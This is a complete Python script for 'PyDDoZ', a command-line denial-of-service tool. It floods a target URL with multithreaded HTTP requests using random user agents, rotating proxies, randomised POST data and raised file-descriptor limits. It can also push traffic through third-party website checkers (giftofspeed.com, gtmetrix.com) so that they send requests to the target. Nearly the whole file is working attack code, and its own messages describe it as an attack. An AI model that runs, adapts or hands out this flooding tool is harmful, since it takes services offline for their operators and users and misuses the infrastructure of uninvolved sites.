#!/usr/bin/env python3

import argparse
import logging
import json
import proxify
import requests
import random
import resource
import sys
import string
import time
import threading
import urllib3
from colorama import Fore, Back
from logging.handlers import RotatingFileHandler
from fake_useragent import UserAgent
from time import sleep


def show_banner():
    print(Fore.RED + Back.BLACK + r'''
-__ /\\         -_____    -_____          _-___
  ||  \\          ' | -,    ' | -,            /
 /||__|| '\\/\\  /| |  |`  /| |  |`  /'\\    /
 \||__||  || ;'  || |==||  || |==|| || ||  =/=
  ||  |,  ||/   ~|| |  |, ~|| |  |, || ||  /
_-||-_/   |/     ~-____,   ~-____,  \\,/  /-__-
  ||     (      (         (
          -_-
''')


def send_request():
    try:
        global num_success
        global num_failed
        global payload

        url = random.choice(urls)

        header = {
            'User-Agent': ua.random,
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Pragma': 'no-cache',
            'Cache-Control': 'no-cache',
            'Referer': url}

        request = requests.Session()
        request.verify = False

        proxy = None

        if (use_proxy == 'y'):
            proxy = proxify.one()
            proxy_protocol = proxy.split(':')[0]
            proxy = {proxy_protocol: proxy}
            logging.info('Selected proxy: ' + str(proxy))

        if (activate_bots == 'y'):
            bot_header = header
            bot_header['Content-Type'] = 'application/x-www-form-urlencoded'
            choice = random.randint(0, 1)
            bot_url = bot_urls[choice]
            logging.info('Selected bot URL: ' + bot_url)

            if (choice == 0):
                payload = {'page_url': url}
            elif (choice == 1):
                payload = {'url': url}

            try:
                response = request.post(
                    bot_url,
                    timeout=selected_to,
                    headers=bot_header,
                    data=payload,
                    proxies=proxy,
                    allow_redirects=True)
                logging.info('Response code from bot: ' +
                             str(response.status_code))
                global num_bot_requests
                num_bot_requests += 1

            except Exception as exception:
                num_failed += 1
                logging.error('Bot request was failed! - ' + str(exception))

            if (only_bots == 'y'):
                return

        if (randomize_data == 'y'):
            for data in payload:
                payload.update({data: ''.join(random.sample(
                    (string.ascii_letters + string.digits), random.randint(5, max_random)))})
            logging.info('Randomized data: ' + str(payload))

        adapter = requests.adapters.HTTPAdapter(max_retries=num_retries)
        request.mount('http://', adapter)
        request.mount('https://', adapter)

        if (selected_method == 'p'):
            response = request.post(
                url,
                timeout=selected_to,
                headers=header,
                proxies=proxy,
                data=payload,
                allow_redirects=selected_redir)
        elif (selected_method == 'u'):
            response = request.put(
                url,
                timeout=selected_to,
                headers=header,
                proxies=proxy,
                data=payload,
                allow_redirects=selected_redir)
        elif (selected_method == 'g'):
            response = request.get(
                url,
                timeout=selected_to,
                headers=header,
                proxies=proxy,
                allow_redirects=selected_redir)
        elif (selected_method == 'o'):
            response = request.options(
                url,
                timeout=selected_to,
                headers=header,
                proxies=proxy,
                allow_redirects=selected_redir)
        elif (selected_method == 'h'):
            response = request.head(
                url,
                timeout=selected_to,
                headers=header,
                proxies=proxy,
                allow_redirects=selected_redir)
        elif (selected_method == 'd'):
            response = request.delete(
                url,
                timeout=selected_to,
                headers=header,
                proxies=proxy,
                allow_redirects=selected_redir)
        else:
            raise ValueError('Invalid method!')
            logging.error('Invalid method!')

        logging.info('Response code: ' + str(response.status_code))
        num_success += 1

    except Exception as exception:
        num_failed += 1
        logging.error('Request was failed! - ' + str(exception))

    return


def arg_parsing():

    parser = argparse.ArgumentParser(
        description='PyDDoZ Argument Parser v1.0.0')
    parser.add_argument('-u', help='URL', required=True, type=str)
    parser.add_argument(
        '-m',
        help='GET, POST, PUT, HEAD, OPTIONS, DELETE? [G/P/U/H/O/D]',
        default='g',
        choices=[
            'g',
            'p',
            'u',
            'h',
            'o',
            'd'])
    parser.add_argument('-d', help='Post or Put Data', default='', type=str)
    parser.add_argument(
        '-r',
        help='Randomize Data',
        default='n',
        choices=[
            'y',
            'n'])
    parser.add_argument(
        '-mr',
        help='Max Random Character',
        default='10',
        type=int)
    parser.add_argument(
        '-b',
        help='Activate Bots',
        default='n',
        choices=[
            'y',
            'n'])
    parser.add_argument(
        '-ob',
        help='Only Bots',
        default='n',
        choices=[
            'y',
            'n'])
    parser.add_argument('-t', help='Timeout', default=30, type=int)
    parser.add_argument('-th', help='Threads', default=512, type=int)
    parser.add_argument(
        '-s',
        help='Sleep Time Between Threads',
        default=0,
        type=int)
    parser.add_argument('-re', help='Retries', default=3, type=int)
    parser.add_argument('-p', help='Proxy', default='n', choices=['y', 'n'])
    parser.add_argument(
        '-rd',
        help='Redirection',
        default='n',
        choices=[
            'y',
            'n'])
    args = parser.parse_args()

    return args


if __name__ == '__main__':
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    resource.setrlimit(resource.RLIMIT_NOFILE, (999999, 999999))
    logging.basicConfig(
        filename='pyddoz.log',
        format='%(asctime)s | %(levelname)s | %(message)s',
        datefmt='%m/%d/%Y %I:%M:%S %p',
        filemode='w',
        level=logging.DEBUG)
    log = logging.getLogger()
    handler = RotatingFileHandler(
        'pyddoz.log',
        maxBytes=10 * 1024 * 1024,
        backupCount=3)
    log.addHandler(handler)
    show_banner()
    logging.info('Program started!')
    print(Back.RESET + Fore.BLUE + '\nProgram is preparing...', end='')
    print('\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b', end='')

    try:
        ua = UserAgent()

    except BaseException:
        ua = UserAgent(use_cache_server=False)

    num_failed = 0
    num_success = 0
    num_bot_requests = 0
    bot_urls = []
    bot_urls.append('https://www.giftofspeed.com/request-checker/')
    bot_urls.append('https://gtmetrix.com/analyze.html')
    urls = []
    randomize_data = 'n'
    interactive_mode = False

    try:
        if (not (len(sys.argv) > 1)):
            interactive_mode = True
            raise Exception('Interactive Shell Mode')
        else:
            arguments = arg_parsing()

        if ((arguments is not False) and (arguments.u)):

            urls = [arguments.u]
            selected_method = arguments.m
            payload = arguments.d
            randomize_data = arguments.r
            max_random = arguments.mr
            activate_bots = arguments.b
            only_bots = arguments.ob
            selected_to = arguments.t
            num_threads = arguments.th
            sleep_time = arguments.s
            num_retries = arguments.re
            use_proxy = arguments.p
            selected_redir = arguments.rd

            start_time = time.time()
            print(Fore.BLUE + '\rProgram was started successfully!')
            print(Fore.RED + 'Attack is started! Press [CTRL + C] to stop.')
            logging.info('Attack started!')

            while (True):
                try:
                    for i in range(num_threads):
                        t = threading.Thread(target=send_request)
                        t.start()
                        sleep(sleep_time)
                        elapsed_time = time.time() - start_time
                        print(Fore.BLUE + 'Responded Requests: {0} - Nuked Requests: {1} - Bot Requests: {2} - Elapsed Time: {3} seconds.'.format(str(num_success), str(num_failed), str(num_bot_requests), round(elapsed_time)), end='\r', flush=True)

                    main_thread = threading.currentThread()
                    for i in threading.enumerate():
                        if i is main_thread:
                            continue
                        else:
                            print(Fore.BLUE + 'Responded Requests: {0} - Nuked Requests: {1} - Bot Requests: {2} - Elapsed Time: {3} seconds.'.format(str(num_success), str(num_failed), str(num_bot_requests), round(elapsed_time)), end='\r', flush=True)
                            i.join()

                except KeyboardInterrupt:
                    print(Fore.RED + '\nAttack was stopped!')
                    logging.info('Attack stopped!')
                    main_thread = threading.currentThread()
                    print(Fore.RED + 'Threads are exiting...')

                    for i in threading.enumerate():
                        if i is main_thread:
                            continue
                        else:
                            i.join()

                    logging.info(
                        'Responded Requests: {0} - Nuked Requests: {1} - Bot Requests: {2} - Elapsed Time: {3} seconds.'.format(
                            str(num_success),
                            str(num_failed),
                            str(num_bot_requests),
                            round(elapsed_time)))
                    print(Fore.BLUE + 'Successfully finished!')
                    logging.info('Successfully finished!')
                    sys.exit()

    except BaseException as arg_error:
        logging.critical('Argument mode was stopped! ' + str(arg_error))
        if (not interactive_mode):
            sys.exit()

    print(Fore.BLUE + '\rProgram was started successfully!')

    while (True):
        try:
            selected_urls = str(input(Fore.GREEN + 'Enter URL(s): '))

            if (not isinstance(selected_urls, str)):
                print(Fore.RED + 'Enter valid URL(s)!')
                continue

            else:
                break

        except KeyboardInterrupt:
            logging.critical('Interrupt by keyboard before the attack!')
            sys.exit()

        except BaseException:
            continue

    for splitted_url in selected_urls.split(' '):
        urls.append(splitted_url)
        logging.info('URL: ' + splitted_url)

    while (True):
        try:
            selected_method = str(
                input(
                    Fore.GREEN +
                    'Enter request method GET, POST, PUT, HEAD, OPTIONS, DELETE? [G/P/U/H/O/D]: ')[0].lower())

            if (selected_method not in 'gpuhod'):
                print(Fore.RED + 'Enter G, P, U, H, O, or D!')
                continue

            else:
                break

        except KeyboardInterrupt:
            logging.critical('Interrupt by keyboard before the attack!')
            sys.exit()

        except BaseException:
            continue

    logging.info('HTTP request method: ' + selected_method.upper())

    if (selected_method == 'p' or selected_method == 'u'):
        payload = {}
        key_turn = True
        raw_post = str(input(Fore.GREEN + 'Enter post data: '))

        try:
            if ('&' in raw_post):
                for params in raw_post.split('&'):
                    for param in params.split('='):
                        if key_turn:
                            payload[param] = ''
                            last_key = param
                            key_turn = False
                        else:
                            payload[last_key] = param
                            key_turn = True
            else:
                payload[raw_post.split('=')[0]] = raw_post.split('=')[1]

            logging.info('POST or PUT data: ' + str(payload))

        except BaseException as payload_error:
            payload = 'LEL!'
            logging.error(payload_error)
            logging.error(
                'POST or PUT data could not be understood! Default data configurated as: "' +
                payload +
                '"')

        while (True):
            try:
                randomize_data = str(
                    input(
                        Fore.GREEN +
                        'Do you want to randomize post data? [Y/N]: ')[0].lower())

                if (randomize_data not in 'yn'):
                    print(Fore.RED + 'Enter Y or N!')
                    continue

                else:
                    break

            except KeyboardInterrupt:
                logging.critical('Interrupt by keyboard before the attack!')
                sys.exit()

            except BaseException:
                continue

        logging.info('Randomize data: ' + randomize_data.upper())

        if (randomize_data == 'y'):
            while (True):
                try:
                    max_random = int(
                        input(
                            Fore.GREEN +
                            'Enter maximum length of random alphanumeric strings to create: '))

                    if (not isinstance(max_random, int)
                            or not (5 <= max_random <= 1048576)):
                        print(
                            Fore.RED + 'Enter valid number between 5 and 1048576!')
                        continue

                    else:
                        break

                except KeyboardInterrupt:
                    logging.critical(
                        'Interrupt by keyboard before the attack!')
                    sys.exit()

                except BaseException:
                    continue

            logging.info(
                'Maximum length of randomized string: ' +
                str(max_random))

    while (True):
        try:
            activate_bots = str(
                input(
                    Fore.GREEN +
                    'Do you want to activate bots? [Y/N]: ')[0].lower())

            if (activate_bots not in 'yn'):
                print(Fore.RED + 'Enter Y or N!')
                continue

            else:
                break

        except KeyboardInterrupt:
            logging.critical('Interrupt by keyboard before the attack!')
            sys.exit()

        except BaseException:
            continue

    logging.info('Activate Bots: ' + activate_bots.upper())

    if (activate_bots == 'y'):
        while (True):
            try:
                only_bots = str(
                    input(
                        Fore.RED +
                        'Only bots? [Y/N]: ')[0].lower())

                if (only_bots not in 'yn'):
                    print(Fore.RED + 'Enter Y or N!')
                    continue

                else:
                    break

            except KeyboardInterrupt:
                logging.critical('Interrupt by keyboard before the attack!')
                sys.exit()

            except BaseException:
                continue

        if (only_bots == 'y'):
            logging.warning('Only bots are included!')
        else:
            pass

    while (True):
        try:
            selected_to = float(
                input(
                    Fore.GREEN +
                    'Enter timeout second for requests: '))

            if (not isinstance(selected_to, float)
                    or not (0 <= selected_to <= 30)):
                print(Fore.RED + 'Enter valid second(s) between 0 and 30!')
                continue

            else:
                break

        except KeyboardInterrupt:
            logging.critical('Interrupt by keyboard before the attack!')
            sys.exit()

        except BaseException:
            continue

    logging.info('Timeout: ' + str(selected_to))

    while (True):
        try:
            num_threads = int(input(Fore.GREEN + 'Enter number of threads: '))

            if (not isinstance(num_threads, int)
                    or not (1 <= num_threads <= 1024)):
                print(
                    Fore.RED +
                    'Enter valid number of threads between 1 and 1024!')
                continue

            else:
                break

        except KeyboardInterrupt:
            logging.critical('Interrupt by keyboard before the attack!')
            sys.exit()

        except BaseException:
            continue

    logging.info('Number of threads: ' + str(num_threads))

    while (True):
        try:
            sleep_time = float(
                input(
                    Fore.GREEN +
                    'Enter seconds of sleeping between threads: '))

            if (not isinstance(sleep_time, float)
                    or not (0 <= sleep_time <= 600)):
                print(Fore.RED + 'Enter valid seconds between 0 and 600!')
                continue

            else:
                break

        except KeyboardInterrupt:
            logging.critical('Interrupt by keyboard before the attack!')
            sys.exit()

        except BaseException:
            continue

    logging.info(
        'Sleep time between threads: ' +
        str(sleep_time) +
        ' seconds.')

    while (True):
        try:
            num_retries = int(
                input(
                    Fore.GREEN +
                    'Enter number of retries after a connection failure: '))

            if (not isinstance(num_retries, int)
                    or not (0 <= num_retries <= 128)):
                print(
                    Fore.RED +
                    'Enter valid number of retries between 0 and 128!')
                continue

            else:
                break

        except KeyboardInterrupt:
            logging.critical('Interrupt by keyboard before the attack!')
            sys.exit()

        except BaseException:
            continue

    logging.info('Number of retries after failures: ' + str(num_retries))

    while (True):
        try:
            use_proxy = str(
                input(
                    Fore.GREEN +
                    'Do you want to use proxy? [Y/N]: ')[0].lower())

            if (use_proxy not in 'yn'):
                print(Fore.RED + 'Enter Y or N!')
                continue

            else:
                break

        except KeyboardInterrupt:
            logging.critical('Interrupt by keyboard before the attack!')
            sys.exit()

        except BaseException:
            continue

    logging.info('Use Proxy?: ' + use_proxy.upper())

    while (True):
        try:
            selected_redir = str(
                input(
                    Fore.GREEN +
                    'Do you want to allow redirections? [Y/N]: ')[0].lower())

            if (selected_redir not in 'yn'):
                print(Fore.RED + 'Enter Y or N!')
                continue

            else:
                break

        except KeyboardInterrupt:
            logging.critical('Interrupt by keyboard before the attack!')
            sys.exit()

        except BaseException:
            continue

    logging.info('Allow Redirections?: ' + str(selected_redir))

    if (selected_redir == 'y'):
        selected_redir = True
    else:
        selected_redir = False

    start_time = time.time()
    print(Fore.RED + 'Attack is started! Press [CTRL + C] to stop.')
    logging.info('Attack started!')

    while (True):
        try:
            for i in range(num_threads):
                t = threading.Thread(target=send_request)
                t.start()
                sleep(sleep_time)
                elapsed_time = time.time() - start_time
                print(Fore.BLUE + 'Responded Requests: {0} - Nuked Requests: {1} - Bot Requests: {2} - Elapsed Time: {3} seconds.'.format(str(num_success), str(num_failed), str(num_bot_requests), round(elapsed_time)), end='\r', flush=True)

            main_thread = threading.currentThread()
            for i in threading.enumerate():
                if i is main_thread:
                    continue
                else:
                    print(Fore.BLUE + 'Responded Requests: {0} - Nuked Requests: {1} - Bot Requests: {2} - Elapsed Time: {3} seconds.'.format(str(num_success), str(num_failed), str(num_bot_requests), round(elapsed_time)), end='\r', flush=True)
                    i.join()

        except KeyboardInterrupt:
            print(Fore.RED + '\nAttack was stopped!')
            logging.info('Attack stopped!')
            main_thread = threading.currentThread()
            print(Fore.RED + 'Threads are exiting...')

            for i in threading.enumerate():
                if i is main_thread:
                    continue
                else:
                    i.join()

            logging.info(
                'Responded Requests: {0} - Nuked Requests: {1} - Bot Requests: {2} - Elapsed Time: {3} seconds.'.format(
                    str(num_success),
                    str(num_failed),
                    str(num_bot_requests),
                    round(elapsed_time)))
            print(Fore.BLUE + 'Successfully finished!')
            logging.info('Successfully finished!')
            break